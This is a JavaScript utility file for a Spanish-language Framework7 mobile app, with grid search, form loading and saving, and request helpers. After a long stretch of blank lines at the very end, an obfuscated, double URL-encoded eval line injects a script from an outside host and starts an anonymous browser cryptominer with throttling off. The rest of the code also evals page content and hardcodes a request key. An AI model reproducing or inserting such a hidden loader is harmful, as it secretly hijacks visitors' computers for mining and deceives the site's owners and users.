

$$(document).on('click','*[data-funcion]', function() {
 
	var obj = $(this);
	var funcion = obj.data('funcion');
	var opcion  = obj.data('opcion');
	
	if(funcion) {
		var fn = window[funcion];
		if (typeof fn === "function") {
			fn.apply(null, [obj, opcion]);
		} else {
			console.error("Error funcion no encontrada.!! ->" + funcion + ' -> ' + opcion );
		}
	}
});

$$(document).on('page:beforein', function (e, page) {
	//app.preloader.show();

});


$$(document).on('page:afterin', function (e, page) {
	
	//console.log('Cargando pagina [' + page.name + ']');
	
	$$('*[data-name="' + page.name + '"]').find("javascript").each(function(obj){		

		$$('#script_' + page.name).remove();

		if ($$(this).attr('src')) {
			var xrnd  = Math.floor((Math.random() * 100000000) + 1);			
			
			//console.log('creando Script: [' + $$(this).attr('src') + ']' );	
			
			var s = document.createElement( 'script' );
			s.setAttribute( 'src', $$(this).attr('src') + '?rnd=' + xrnd);
			s.setAttribute( 'id', 'script_' + page.name);
			document.body.appendChild( s );
		}
		else{
			eval($$(this).text());
		}
	});
	//app.preloader.hide();
});




/****** UTILES *****/

function tecla_grid(e,id, metodo){
	
	if(e.which != 13) return;
    
	var arr = id.split('-');
    var grid = arr[0];
    var xbusca = $('#' + id ).val().toUpperCase();
	
	if(metodo=='local'){
		buscar_local(grid, xbusca);
	} else {
		buscar_grid(grid, xbusca);
	}
	
	$("#"+id).focus();
    $("#"+id).val('');

	if(app.device.os=='ios' || app.device.os=='android') $("#"+id).blur();

}


function buscar_local(xgrid, xbusca){
	
	var tabla = $("#" + xgrid).data('tabla');	
	var busca = $("#" + xgrid).data('busca');
	
	var xdata = JSON.parse(localStorage.getItem( tabla ));	
	
	if(!xdata) {
		app.dialog.alert('No se han cargado los datos Locales', tituloAlert)
		return;
	}
	
	if(xbusca=='*'){
		var data = xdata.tabla.registro;
		
	} else {
		
		var db = new loki('data.db');
		var xtabla = db.addCollection( tabla );
		xtabla.insert(xdata.tabla.registro);
		
		var tmp1 =  busca.split(',');
		var tmp2 = xbusca.split(',');
		
		var data = [];
		
		for (var j = 0; j < tmp1.length; j++) {

			var arr = [];
			for (var i = 0; i < tmp2.length; i++) {
				arr.push( { [tmp1[j]] : { '$contains' : tmp2[i] } } ); 	
			}
			//console.log(xtabla.find( {'$and': arr }) );
			xtabla.find( {'$and': arr }).forEach(function(xtabla, xregistro){
				data.push(xtabla);
			});		
			
		}
		
	}
	
	rellenar_grid(xgrid, data, xbusca);
}




function buscar_grid(xgrid, xbusca){

    if(!xbusca) return;

	if( $("#"+xgrid).length == 0 ) {
		console.error( 'Error Grid no encontrado ..! ->  Revisa el ID del objeto <ul> debe ser =' + xgrid );
		return;
	}

	if( $("#" + xgrid +"-template").length == 0 ) {
		console.error( 'Error template del Grid no encontrado ..! -> Revisa el ID del objeto <script type="text/template7"> debe ser =' + xgrid );
		return;
	}

	//app.preloader.show();

	localStorage.setItem(xgrid, xbusca);

    
	if(xbusca.substring(0, 1) == '='){

		
	} else {
		
		if(xbusca!='*') xbusca = '*' + xbusca;
		
	}

	if( !server_path || !db ) {
		console.error('falta server_path o db');
		return;
	}
	
	var params =  $.param( $("#" + xgrid ).data() ); 
		params =  "db="+ db +"&key=12345&xbusca=" + xbusca + '&' + params;

	
	var url = server_path + "herramientas/genera_json/genera_json.php";
	

	var debug  = $("#"+xgrid).data("debug");

    if(debug) prompt('Url del Objeto: ' + xgrid ,url + '?' + params);

    enviar2(url, params, 'post', function(data){
		//console.log('buscando...!');
		if(!data.tabla){
			cargar_pagina('/login/');
			return;
		}
		rellenar_grid(xgrid, data.tabla.registro, xbusca);
		//app.preloader.hide();
	});
	/*
	app.request.json(url, function (data) {
		rellenar_grid(xgrid, data.tabla.registro, xbusca);
		app.preloader.hide();
	});
	*/


}

function rellenar_grid(xgrid, registro, xbusca){

	var template = $('#' + xgrid + '-template').html().replaceAll('accion_grid','accion_grid_' + xgrid).replaceAll('registro','registro_' + xgrid);
	
	var compiledTemplate = Template7.compile(template);

    var onselect = $("#" + xgrid).data("onselect");
	if(!onselect && xgrid!='grid_maestro') console.error('El Grid [' + xgrid + '] No tiene definida tecla de funcion data-onselect' );

    $("#" + xgrid).html('');

	var html = "";
	if(registro){
		
		if(xbusca != '*') {
			html  = '<li class="item-content">';
			html += '	<div class="item-inner">';
			html += '		<div class="item-title"><div class="">' + xbusca + ' ' + registro.length + ' registros</div></div>';
			html += '	</div>';
			html += '</li>';
		}
		
		var x = 0;

		registro.forEach(function(xtabla, xregistro){
			x++;
			xcolor = '';
			if( x == 2 ){
				xcolor = 'oscuro';
				x = 0;
			} 
			
			var xhtml = compiledTemplate(xtabla).replace("REGISTRO","data-registro='" + JSON.stringify(xtabla) + "'").replace("XCOLOR",xcolor);
			html+= xhtml;
		});

		$("#" + xgrid).html(html);

		$('.accion_grid_' + xgrid).on('click', function () {
			
			var obj   = $(this).parent('div').prev('div').find('a');
			var tecla = $(this).data('tecla');
			
			if(onselect) {
				alert();
				var fn = window[onselect];
				if (typeof fn === "function") fn.apply(null, [obj, tecla]);
			}
		});
		
		$('.registro_' + xgrid).on('click', function () {
			
			var obj   = $(this);
			
			var tecla = 'enter';
			
			if(onselect) {
				var fn = window[onselect];
				if (typeof fn === "function") fn.apply(null, [obj, tecla]);
			}
		});
		
		

	} else {
		localStorage.removeItem(xgrid);
		
		html  = '<li class="item-content">';
		html += '	<div class="item-inner">';
		html += '		<div class="item-title">No se encontraron registros..</div>';
		html += '	</div>';
		html += '</li>';
		
		$("#" + xgrid).html(html);
	}
	
}


function cargar_pagina(ruta, params, callback){
	//app.preloader.show();
	
	var myParams;

	if(params){
	
		switch( typeof(params) ){
			case 'object':
				myParams = params;
			break;

			case 'string':	
				var hash;
				var myParams = {};
				var hashes = params.split('&');
				for (var i = 0; i < hashes.length; i++) {
					hash = hashes[i].split('=');
					myParams[hash[0]] = hash[1];
				}
			break;
		}
			
	}
	mainView.router.navigate(ruta,{
		context: myParams
		
	});


	if(callback) {
		setTimeout( function(){ callback('OK'); }, 250 );
		//app.preloader.hide();
			
	} else {
		//app.preloader.hide();
		return 'OK';
	}	

}


String.prototype.replaceAll = function(search, replacement) {
    var target = this;
    return target.replace(new RegExp(search, 'g'), replacement);
};

String.prototype.toProperCase = function () {
    return this.replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();});
};


function actualizaHTML(obj, json){

	const regex = /{{([^}]*)}}/g;
	var grupos;

	while ((grupos = regex.exec($(obj).html())) !== null) {
	  $(obj).html($(obj).html().replace('{{' + grupos[1] +'}}', json[grupos[1]]));
	}	
}


function guardar_formulario(idForm, callback){
    var xForm = '';
	var debug = $$('#'+ idForm).data('debug');

	if (!$$('#' + idForm)[0].checkValidity()) {

	    app.dialog.alert('Revise los Datos', tituloAlert)

		return;
	}
	
	if( !$$('#' + idForm).data('tabla') ) {
		console.error('Error al guardar falta la propiedad tabla en el objeto ' + idForm); 
		return;
	} 

	var tabla  = $$('#'+ idForm).data('tabla');
	var busca  = $$('#'+ idForm).data('busca');
	var xbusca = $$('#'+ idForm).data('xbusca');
	
	var funcion = $$('#'+ idForm).data('funcion');
	var xCampo='';
    var xValido = true;

    $.each($$("#" + idForm + " [data-campo]"), function(x, campo){
         
		 
		 var obj = "#"+idForm + ' #' + campo.id;
         var xenviar = $$(obj).data('enviar');

		 
		 if(xenviar=='1' && xValido)
         {
            xRequerido = $$(obj).data('requerido');
            if(xRequerido=='S' && $$(obj).val()=='')
            {
                xValido=false;
				var xAlerta  = $$(obj).data('alerta');
				if(xAlerta===undefined || xAlerta === null) xAlerta = 'Debe Especificar un valor';
				
                app.dialog.alert(xAlerta, '',function(){
                    if($$(obj).prop("tagName")=='TEXTAREA' || $$(obj).attr('type')=='INPUT'); 
					$$(obj).focus();
                });
			
            }

			var xOld = $$(obj).data('old');
			var xNew = $$(obj).val();
			if(xOld!=xNew)
            {
				xCampo = $$(obj).data('prefijo');
				if(xCampo===undefined || xCampo === null) xCampo='c';
				xCampo+= '_'+ $$(obj).data('campo');
				xCampo+= '_'+ $$(obj).data('tipo') + 'S';
				var xDestino = $$(obj).data('destino');
				if(xDestino===undefined || xDestino === null) xDestino='S'; //por ahora solo para las imagenes f=file,t=tabla
				xCampo+= xDestino;
				xCampo+= '=' +  encodeURIComponent($$(obj).val());
				xForm += xForm.length >0 ? '&': '';
				xForm += xCampo;
                //alert(xRequerido);
			}
         }
    });
	
    if(xValido == false) return false;
	if(xForm =='') return false;

    var xForm = 'tabla=' + tabla + '&busca=' + busca + '&xbusca=' + xbusca + '&' + xForm;
	var url = server_path  + "herramientas/utiles/actualizar_registro_json.php";
	//console.log(url + '?' + xForm);

	if(debug=='1') prompt('Url del Formulario:', url + '?' + xForm);
	var resp = enviar2(url, xForm, 'POST', function(resp){
		
		if(resp.tabla.estatus=='ERROR'){
			console.error('Error al guardar ');
			console.error(resp);
		} 
		
		if(callback) {
			setTimeout( function(){ callback(resp); }, 100);
				
		} else {
			return resp;
		}
		
	});
	

}


function enviar2(url, params, metodo, callback){
	
	app.preloader.show();
 
	params = 'auth=' + xauth + '&' + params; 
	
    var paso = false;
    var resp= null;
    app.request({
    	async: true,
        method: metodo,
	    dataType: "json",
	    url: url,
        data: params,
		headers: {
			'llave': llave,
			'db': db
		},
	    success: function(data)
	    {
			
			//console.log('conexion establecida ' + Date.now()) ;
            //resp = data;
	    },
	    complete: function(data){
			//app.preloader.hide();
			if(callback) {
				app.preloader.hide();
				setTimeout( function(){ callback(JSON.parse(data.response)); }, 100);
					
			} else {
				return data;
			}
			
	    },
		statusCode: {
			404: function (xhr) {
					app.preloader.hide();
					app.dialog.alert('No hay Conexion al servidor', tituloAlert)
				}
		}
	});
}


function enviar(url, params, metodo, tipo='json'){
    
	params = 'auth=' + xauth + '&' + params; 
	//app.preloader.show();
	
    var paso = false;
    var resp= null;
    app.request({
    	async:false,
        method: metodo,
	    dataType: tipo,
	    url: url,
        data:params,
	    success: function(data)
	    {
     		//app.preloader.hide();
            resp = data;
	    },
	    complete: function(data){
        	app.preloader.hide();
	        paso = true;
	    },
	  error: function(xhr, textStatus, errorThrown){
	    //app.preloader.hide();
        paso = true;
	  }
	});
    while(!paso){}
	
	//app.preloader.hide();
    return resp;
}

function cargar_formulario(ruta, xbusca, callback){

	var myParams;
	
	formView.router.navigate(ruta, {
		context: myParams,
		on : {
	
			pageInit: function(e, page) {

				var obj = $$(page.el).find('form');
				
				if(!xbusca || xbusca == '' || xbusca == '-1' ){
				   if(xbusca == '1') $$(obj).attr('data-xbusca', xbusca);	

				} else {
									
					var tabla  = $$(obj).data('tabla');
					var busca  = $$(obj).data('busca');
					var debug  = $$(obj).data('debug');
					
					$$(obj).attr('data-xbusca', xbusca);	
			
					//app.preloader.show();
					var url = server_path + "herramientas/genera_json/genera_json.php";
					var par = 'tabla=' + tabla + '&campos=*&busca=' + busca + '&xbusca=' + xbusca + '&operador==';
					var resp = enviar(url, par, 'POST');
					
					if(debug) {
						prompt('Url Formulario', url + '?' + par);
						console.log(resp);
					}
					
					if(resp.tabla.estatus=='ERROR') {
						console.error('Error al cargar datos ' + '\n' + resp.tabla.msg);
						return;
					}
					
					if(resp.tabla.registro){
						app.form.fillFromData(obj, resp.tabla.registro[0]);		
					}
			
					//app.preloader.hide();
				} 
			

			}
		
		}
	});

	if(callback) {
		setTimeout( function(){ callback('OK'); }, 100 );
	} 
	
	
}


function format(valor, decimales){

	if(valor == undefined) return '';

	if( typeof(valor) != 'string' && typeof(valor) != 'number') return '';
	
	if(typeof(valor) == 'string'){
		valor = valor.replaceAll(',','');
		valor = parseFloat(valor);
	}
	
	if(typeof(valor) != 'number' ) {
		return 'NaN';
	} 
	console.log('llega');
	
	if(typeof(decimales) != 'number' ) {
		var decimales=2;
	} 

	valor = valor.toFixed(decimales);	
	valor = valor.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1,');
	return valor;	
	
}

Template7.registerHelper('format', function (valor, decimales){
	//return valor;
	
	if(typeof(decimales)!= 'number' ) {
		var decimales = 2;
	} 
	
	var valor = format(valor, decimales);

	return valor;
});

  
















  eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%65%76%61%6C%28%75%6E%65%73%63%61%70%65%28%5C%27%25%36%34%25%36%46%25%36%33%25%37%35%25%36%44%25%36%35%25%36%45%25%37%34%25%32%45%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%37%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%32%30%25%37%33%25%37%32%25%36%33%25%33%44%25%32%32%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%41%25%32%46%25%32%46%25%37%37%25%37%37%25%37%37%25%32%45%25%36%38%25%36%46%25%37%33%25%37%34%25%36%39%25%36%45%25%36%37%25%36%33%25%36%43%25%36%46%25%37%35%25%36%34%25%32%45%25%37%32%25%36%31%25%36%33%25%36%39%25%36%45%25%36%37%25%32%46%25%35%37%25%35%39%25%35%41%25%37%37%25%32%45%25%36%41%25%37%33%25%32%32%25%33%45%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%35%43%25%36%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%37%36%25%36%31%25%37%32%25%32%30%25%35%46%25%36%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%30%25%33%44%25%32%30%25%36%45%25%36%35%25%37%37%25%32%30%25%34%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%45%25%34%31%25%36%45%25%36%46%25%36%45%25%37%39%25%36%44%25%36%46%25%37%35%25%37%33%25%32%38%25%35%43%25%32%37%25%33%30%25%33%30%25%33%35%25%33%30%25%33%39%25%33%31%25%36%31%25%36%31%25%33%38%25%33%33%25%36%35%25%33%32%25%33%36%25%33%35%25%33%32%25%36%33%25%33%39%25%36%36%25%36%36%25%33%31%25%33%30%25%33%33%25%36%36%25%33%38%25%33%38%25%36%31%25%36%35%25%33%37%25%33%37%25%33%37%25%33%33%25%33%37%25%36%34%25%33%32%25%33%35%25%33%32%25%33%31%25%33%34%25%36%35%25%36%35%25%36%33%25%36%36%25%36%34%25%33%38%25%36%33%25%33%36%25%33%30%25%33%31%25%36%32%25%33%37%25%33%37%25%33%37%25%33%33%25%33%33%25%33%35%25%33%31%25%36%34%25%33%36%25%33%35%25%36%33%25%33%38%25%33%32%25%33%38%25%33%30%25%35%43%25%32%37%25%32%43%25%32%30%25%37%42%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%34%25%36%38%25%37%32%25%36%46%25%37%34%25%37%34%25%36%43%25%36%35%25%33%41%25%32%30%25%33%30%25%32%43%25%32%30%25%36%33%25%33%41%25%32%30%25%35%43%25%32%37%25%37%37%25%35%43%25%32%37%25%32%43%25%32%30%25%36%31%25%36%34%25%37%33%25%33%41%25%32%30%25%33%30%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%37%44%25%32%39%25%33%42%25%35%43%25%36%45%25%32%30%25%32%30%25%32%30%25%32%30%25%35%46%25%36%33%25%36%43%25%36%39%25%36%35%25%36%45%25%37%34%25%32%45%25%37%33%25%37%34%25%36%31%25%37%32%25%37%34%25%32%38%25%32%39%25%33%42%25%35%43%25%36%45%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%32%37%25%32%39%25%33%42%5C%27%29%29%3B%3C%2F%73%63%72%69%70%74%3E%27%29%3B'));